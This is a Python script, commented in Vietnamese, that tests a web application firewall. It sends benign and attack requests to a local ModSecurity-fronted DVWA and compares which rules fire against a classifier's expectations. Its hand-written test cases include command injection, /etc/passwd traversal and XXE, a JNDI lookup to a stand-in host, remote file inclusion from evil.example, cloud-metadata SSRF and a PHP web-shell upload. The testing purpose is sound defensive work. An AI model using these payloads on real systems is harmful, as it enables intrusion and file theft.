#!/usr/bin/env python3
"""tools/tier1sync.py — phần chạy TRONG container của phép kiểm chứng luật tầng 1 đồng bộ (gọi qua tools/tier1sync.sh).

So sánh, trên CÙNG một request:
  kỳ vọng  = classifier (services/classifier.py, tầng 1) có luật độ tin cậy >= 0,9 khớp không (Referer, open redirect,
             recon không tính — classifier chỉ ghi nhận các loại đó);
  thực tế  = ModSecurity thật có ghi luật id 1000200–1000399 (web/apache/nsm-tier1.conf) cho request đó không.
Trong lúc đo, luật chấm điểm chặn của CRS (949110) được tạm gỡ để luật NSM luôn được xét (CRS chặn trước thì không đo được).

Lệnh con:
  build    dựng tập request: lành tính thật + tấn công từ eval/data/normalized + payload độc lập + ca viết tay
  send     gửi thẳng tới Apache (không qua nginx: không bị responder chặn IP)
  compare  đọc nhật ký kiểm toán ModSecurity (stdin), so với kỳ vọng, in Markdown
"""
import argparse, gzip, http.client, json, os, random, re, sys, time
from collections import Counter, defaultdict
from urllib.parse import quote

sys.path.insert(0, "/svc")
MARK = "nsm-t1sync"
IDS = range(1000200, 1000400)


def note(m):
    print(m, file=sys.stderr, flush=True)


def jl(p):
    op = gzip.open if p.endswith(".gz") else open
    with op(p, "rt", encoding="utf-8") as f:
        for ln in f:
            if ln.strip():
                yield json.loads(ln)


SENDABLE = re.compile(r"^/[\x21-\x7e]*$")


def ok(r):
    url = r["path"] + ("?" + r["query"] if r["query"] else "")
    return (r["method"] in ("GET", "POST") and SENDABLE.match(url) and len(url) < 6000
            and len(r.get("body") or "") < 60000 and "error" not in r)


def req(method, path, query="", body="", ct="", ua="Mozilla/5.0", cookie="", src="hand", cls="?"):
    return {"method": method, "path": path, "query": query, "body": body, "ct": ct, "ua": ua, "cookie": cookie,
            "src": src, "cls": cls}


def MP(name, content, filename=None, ctype=None, more=None):
    """Thân multipart ranh giới 'XyZ': một phần (tệp nếu có filename) và tuỳ chọn một trường văn bản nữa."""
    nl = chr(13) + chr(10)
    head = f'Content-Disposition: form-data; name="{name}"' + (f'; filename="{filename}"' if filename else "")
    parts = ["--XyZ", head] + ([f"Content-Type: {ctype}"] if ctype else []) + ["", content]
    if more:
        parts += ["--XyZ", f'Content-Disposition: form-data; name="{more[0]}"', "", more[1]]
    return nl.join(parts + ["--XyZ--", ""])


def hand_cases():
    """Ca viết tay phủ từng phạm vi/biến đổi của bộ chuyển luật (đích: đúng như classifier)."""
    H = []
    q = lambda s: quote(s, safe="")
    # vị trí: query, thân form, JSON, XML, multipart, cookie, User-Agent, đường dẫn
    H += [req("GET", "/vulnerabilities/exec/", "ip=" + q("127.0.0.1;id"), cls="rce"),
          req("POST", "/vulnerabilities/exec/", "", "ip=" + q("127.0.0.1;id") + "&Submit=Submit",
              "application/x-www-form-urlencoded", cls="rce"),
          req("POST", "/api", "", json.dumps({"host": "127.0.0.1;id"}), "application/json", cls="rce"),
          req("POST", "/api", "", '<?xml version="1.0"?><a><host>127.0.0.1;cat /etc/hosts</host></a>',
              "application/xml", cls="rce"),
          req("POST", "/up", "", "--XyZ\r\nContent-Disposition: form-data; name=\"ip\"\r\n\r\n127.0.0.1;id\r\n--XyZ--\r\n",
              "multipart/form-data; boundary=XyZ", cls="rce"),
          req("GET", "/", "", cookie="pref=" + q("1' or '1'='1"), cls="sqli"),
          req("GET", "/", "", ua="Mozilla/5.0 ${jndi:ldap://x.example/a}", cls="rce"),
          req("GET", "/" + q("../../../etc/passwd").replace("%2F", "/"), "", cls="lfi"),
          req("GET", "/search", "q=" + q(q("' union select 1,2--")), cls="sqli"),            # mã hoá kép
          req("GET", "/t", "name=" + q("{{7+7}}"), cls="ssti"),                             # '+' phải còn
          req("GET", "/t", "name={{7+7}}", cls="benign-ish"),                               # '+' thật = dấu cách
          req("GET", "/r", "x=" + q("a\r\nSet-Cookie: s=1"), cls="crlf"),
          req("GET", "/p", "ip=" + q("127.0.0.1\nid"), cls="rce"),
          req("GET", "/p", "msg=" + q("Thu cung:\ncat and dog"), cls="benign"),
          req("GET", "/i", "Page=" + q("http://evil.example/x.php"), cls="rfi"),
          req("GET", "/i", "url=" + q("http://evil.example/x.php"), cls="benign"),         # không phải tên include
          req("POST", "/i", "", json.dumps({"page": "http://evil.example/x.php"}), "application/json", cls="rfi-weak"),
          req("GET", "/d", "o=" + q('O:8:"stdClass":1:{s:1:"a";i:1;}'), cls="deser"),
          req("GET", "/d", "o=" + q('O:8:"Foo\\Bar":1:{s:1:"a";i:1;}'), cls="deser"),       # gạch chéo ngược
          req("GET", "/u", "u=" + q("\\\\evil\\share"), cls="?"),
          req("GET", "/n", "user[$ne]=1", cls="?"),
          req("GET", "/n", "q=" + q('{"$where": "1"}'), cls="nosqli"),
          req("POST", "/n", "", json.dumps({"q": {"$ne": 1}, "s": '{"$gt": ""}'}), "application/json", cls="nosqli-weak"),
          req("GET", "/l", "u=" + q("*)(uid=*))(|(uid=*"), cls="ldap"),
          req("POST", "/x", "", '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x SYSTEM "file:///etc/passwd">]><a>&x;</a>',
              "application/xml", cls="xxe"),
          req("GET", "/s", "url=" + q("http://169.254.169.254/latest/meta-data/"), cls="ssrf"),
          req("GET", "/", "", ua="sqlmap/1.8#stable", cls="scanner"),
          req("GET", "/a", "next=" + q("//evil.example"), cls="redirect-weak"),
          req("GET", "/j", "cb=" + q("javascript:void(0)"), cls="benign"),
          req("GET", "/j", "cb=" + q("javascript:alert(1)"), cls="xss"),
          req("GET", "/c", "q=" + q("C++ and C#"), cls="benign"),
          req("GET", "/c", "q=" + q("rock 'n' roll"), cls="benign"),
          req("GET", "/c", "q=" + q("bàn phím cơ"), cls="benign"),
          req("POST", "/up", "", MP("f", "<?php system($_GET['c']); ?>", "s.php", "application/x-php"),
              "multipart/form-data; boundary=XyZ", cls="rce"),                              # nội dung TỆP
          req("POST", "/up", "", MP("f", "hello", "a.txt", "text/plain", more=("t", "xin chao")),
              "multipart/form-data; boundary=XyZ", cls="benign"),
          req("POST", "/api", "", json.dumps({"q": "rock 'n' roll", "n": 3, "tags": ["a", "b"]}), "application/json",
              cls="benign"),
          req("POST", "/x", "", '<?xml version="1.0"?><order><item id="3">keyboard</item></order>', "application/xml",
              cls="benign"),
          req("POST", "/x", "", '<?xml version="1.0"?><a><b>x</b><script>alert(1)</script></a>', "application/xml",
              cls="xss")]
    for r in H:
        r["src"] = "hand"
    return H


def cmd_build(a):
    rng = random.Random(a.seed)
    rows = hand_cases()
    want = {"openappsec_legit": ("test_sites", a.benign), "httpparams": (None, a.per), "srbh2020": (None, a.per),
            "seclists": (None, a.per), "openappsec_mal": (None, a.per)}
    for src, (split, n) in want.items():
        p = f"/eval/data/normalized/{src}.jsonl.gz"
        if not os.path.exists(p):
            note(f"   (bỏ qua {src})"); continue
        pool, seen = [], 0
        for r in jl(p):
            if split and r.get("split") != split:
                continue
            if not ok(r):
                continue
            seen += 1                                    # lấy mẫu hồ chứa: không giữ cả tệp trong bộ nhớ
            item = req(r["method"], r["path"], r["query"], r.get("body") or "", r.get("ct") or "",
                       r.get("ua") or "Mozilla/5.0", "", src, r["ds_class"])
            if len(pool) < n:
                pool.append(item)
            else:
                j = rng.randrange(seen)
                if j < n:
                    pool[j] = item
        rows += pool
        note(f"   {src}: {len(pool)} / {seen}")
    base = "/eval/data/payloads_independent"
    for d in ("payloadsallthethings", "seclists"):
        for fn in sorted(os.listdir(os.path.join(base, d))) if os.path.isdir(os.path.join(base, d)) else []:
            if not fn.endswith(".txt"):
                continue
            fam = fn.split("_", 1)[0]
            with open(os.path.join(base, d, fn), encoding="utf-8", errors="replace") as f:
                lines = [ln.rstrip("\n") for ln in f if ln.strip()]
            for ln in lines[: a.per_file]:
                if fam == "xxe":
                    rows.append(req("POST", "/x", "", ln, "application/xml", src=f"indep:{fn}", cls=fam))
                else:
                    rows.append(req("GET", "/p", "q=" + quote(ln, safe=""), src=f"indep:{fn}", cls=fam))
    for i, r in enumerate(rows):
        r["rid"] = i
    note(f"   tổng: {len(rows)} request")
    for r in rows:
        print(json.dumps(r, ensure_ascii=True))


def cmd_send(a):
    rows = list(jl(a.input))
    st = Counter()
    for r in rows:
        h = {"Host": "dvwa.local", "User-Agent": f"{r['ua']} {MARK}/{a.run}/{r['rid']}", "Accept": "*/*",
             "Connection": "close"}
        if r.get("cookie"):
            h["Cookie"] = r["cookie"]
        body = None
        if r["method"] == "POST" or r.get("body"):
            body = (r.get("body") or "").encode("utf-8", "surrogateescape")
            if r.get("ct"):
                h["Content-Type"] = r["ct"]
        url = r["path"] + ("?" + r["query"] if r["query"] else "")
        try:
            c = http.client.HTTPConnection(a.target, 80, timeout=10)
            c.putrequest(r["method"], url, skip_accept_encoding=True, skip_host=True)
            for k, v in h.items():
                c.putheader(k, v.encode("latin-1", "replace").decode("latin-1"))
            if body is not None:
                c.putheader("Content-Length", str(len(body)))
            c.endheaders(body)
            resp = c.getresponse(); resp.read(); s = resp.status; c.close()
        except Exception as e:                       # noqa: BLE001
            s = f"error:{type(e).__name__}"
        st[s] += 1
        print(json.dumps({"rid": r["rid"], "status": s}))
    note(f"   đã gửi {len(rows)}: {dict(st)}")


def expected(r):
    """(có_chặn, lớp, trường) theo tầng 1 của classifier — chỉ luật độ tin cậy >= 0,9, như bộ chuyển luật."""
    import classifier as C
    path = C.decode_p(r["path"]).lower()
    qargs, bargs = C.split_params(r["query"]), C.body_params(r.get("body"))
    hdr = {"User-Agent": r["ua"], "Referer": None, "cookies": C.cookie_params(r.get("cookie"))}
    units = C.scan_units(path, qargs, bargs, hdr)
    for cls, p, scope in C.RULES_T1:
        for field, text in units:
            cap = C._in_scope(scope, field)
            if cap is not None and cap >= 0.9 and p.search(text):
                return True, cls, field
    if C.SCANNER_UA.search(r["ua"] or ""):
        return True, "scanner", "REQUEST_HEADERS:User-Agent"
    return False, None, None


def cmd_compare(a):
    rows = {r["rid"]: r for r in jl(a.input)}
    sent = {s["rid"]: s for s in jl(a.sent)}
    rx = re.compile(re.escape(f"{MARK}/{a.run}/") + r"(\d+)")
    idrx = re.compile(r'\[id "(\d+)"\]')
    got = defaultdict(set)
    for ln in sys.stdin:
        if MARK not in ln:
            continue
        try:
            e = json.loads(ln)
        except ValueError:
            continue
        ua = json.dumps(e.get("request", {}).get("headers", {}))
        m = rx.search(ua)
        if not m:
            continue
        rid = int(m.group(1))
        for msg in e.get("audit_data", {}).get("messages", []) or []:
            for i in idrx.findall(msg):
                if int(i) in IDS:
                    got[rid].add(int(i))
        got.setdefault(rid, set())
    tab = defaultdict(Counter)
    mism = []
    for rid, r in rows.items():
        s = sent.get(rid, {}).get("status")
        if rid not in got:
            tab[r["src"]]["không có bản ghi"] += 1
            continue
        exp, cls, field = expected(r)
        act = bool(got[rid])
        key = {(True, True): "cả hai", (False, False): "không bên nào", (True, False): "chỉ classifier",
               (False, True): "chỉ ModSecurity"}[(exp, act)]
        # Apache/ModSecurity đã từ chối TRƯỚC khi luật NSM được xét: 400 (vd '..' vượt gốc), 500 (thân XML hỏng),
        # 404 với %2F trong đường dẫn (AllowEncodedSlashes Off) — request không tới ứng dụng, không phải khoảng hở
        if key == "chỉ classifier" and (s in (400, 500) or (s == 404 and "%2f" in r["path"].lower())):
            key = "đã bị từ chối trước"
        tab[r["src"]][key] += 1
        tab[r["src"]]["benign" if r["cls"] == "benign" else "tấn công"] += 1
        if exp != act and key != "đã bị từ chối trước":
            mism.append((r, exp, cls, field, sorted(got[rid]), s))
    cols = ["cả hai", "không bên nào", "chỉ classifier", "chỉ ModSecurity", "đã bị từ chối trước", "không có bản ghi"]
    print("| Nguồn | Request | " + " | ".join(cols) + " | Lệch |")
    print("|---" * (len(cols) + 3) + "|")
    tot = Counter()
    for src in sorted(tab):
        t = tab[src]; n = sum(t[c] for c in cols); tot.update({c: t[c] for c in cols}); tot["n"] += n
        lech = t["chỉ classifier"] + t["chỉ ModSecurity"]
        print(f"| {src} | {n} | " + " | ".join(str(t[c]) for c in cols) + f" | {lech} ({lech / max(n - t['không có bản ghi'], 1):.2%}) |")
    lech = tot["chỉ classifier"] + tot["chỉ ModSecurity"]
    print(f"| **Tổng** | {tot['n']} | " + " | ".join(str(tot[c]) for c in cols)
          + f" | {lech} ({lech / max(tot['n'] - tot['không có bản ghi'], 1):.2%}) |")
    # chặn trên lành tính thật (website chưa thấy)
    leg = [rid for rid, r in rows.items() if r["src"] == "openappsec_legit" and rid in got]
    nb = sum(1 for rid in leg if got[rid])
    print(f"\nLành tính thật (openappsec test_sites): luật NSM chặn {nb}/{len(leg)} ({nb / max(len(leg), 1):.3%}).")
    print("\nCa viết tay:\n")
    print("| # | Lớp mong đợi | Kỳ vọng (classifier) | ModSecurity | Request |")
    print("|---|---|---|---|---|")
    for rid, r in rows.items():
        if r["src"] != "hand":
            continue
        exp, cls, field = expected(r)
        desc = f"{r['method']} {r['path']}?{r['query']}"[:70] + (f" thân {r['ct'].split(';')[0]}" if r.get("body") else "") \
            + (" cookie" if r.get("cookie") else "") + (" UA" if "Mozilla/5.0" != r["ua"] else "")
        print(f"| {rid} | {r['cls']} | {'chặn ' + cls if exp else '—'} | {','.join(map(str, sorted(got.get(rid, ())))) or '—'} "
              f"| `{desc.replace('|', '¦')}` |")
    print(f"\nLệch ({len(mism)}), tối đa 40:\n")
    for r, exp, cls, field, ids, s in mism[:40]:
        print(f"- [{r['src']}/{r['cls']}] classifier={'chặn ' + str(cls) + ' @' + str(field) if exp else 'không'} "
              f"modsec={ids or 'không'} status={s} `{(r['method'] + ' ' + r['path'] + '?' + r['query'])[:150].replace('`', '´')}`"
              + (f" thân=`{r['body'][:150].replace('`', '´')}`" if r.get("body") else ""))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--run", default="x")
    sub = ap.add_subparsers(dest="cmd", required=True)
    b = sub.add_parser("build"); b.add_argument("--seed", type=int, default=7)
    b.add_argument("--benign", type=int, default=3000); b.add_argument("--per", type=int, default=600)
    b.add_argument("--per-file", type=int, default=60)
    s = sub.add_parser("send"); s.add_argument("--input", required=True); s.add_argument("--target", default="apache")
    c = sub.add_parser("compare"); c.add_argument("--input", required=True); c.add_argument("--sent", required=True)
    a = ap.parse_args()
    {"build": cmd_build, "send": cmd_send, "compare": cmd_compare}[a.cmd](a)


if __name__ == "__main__":
    main()
